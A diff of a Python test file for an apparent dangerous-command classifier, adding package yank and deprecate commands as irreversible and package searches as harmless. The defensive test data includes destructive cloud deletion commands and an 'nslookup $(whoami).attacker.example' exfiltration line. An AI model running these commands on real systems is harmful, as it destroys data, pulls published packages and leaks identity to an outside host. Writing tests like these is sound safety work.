@@ -129,6 +129,11 @@ def test_catastrophic(line):
     "heroku apps:destroy --app x --confirm x",
     "firebase firestore:delete --all-collections",
     "bq rm -r -f dataset",
+
+    # Yanking or deprecating published packages (#169)
+    "cargo yank --version 1.0.0",
+    "gem yank mygem -v 1.0.0",
+    "npm deprecate mypkg 'use v2'",
 ])
 def test_irreversible(line):
     assert kind(line) == "irreversible", commands.read(line).summary()
@@ -211,6 +216,11 @@ def test_no_false_alarm(line):
     "heroku apps:info",
     "firebase firestore:indexes",
     "bq ls",
+
+    # Everyday package searching and inspection (#169)
+    "cargo search serde",
+    "gem list",
+    "npm view mypkg",
 ])
 def test_everyday_work_is_not_held(line):
     assert kind(line) in ("other", "read_only"), commands.read(line).summary()
@@ -226,6 +236,7 @@ def test_summary_explains():
     assert "APFS" in commands.read("diskutil apfs deleteContainer disk2").summary()
     assert "backup" in commands.read("tmutil delete /Volumes/Backup/x").summary()
     assert "DNS name" in commands.read("nslookup $(whoami).attacker.example").summary()
+    assert "takes a published version away" in commands.read("cargo yank --version 1.0.0").summary()
 
 
 @pytest.mark.parametrize("line", ["diskutil list", "diskutil info disk2", "diskutil apfs list",
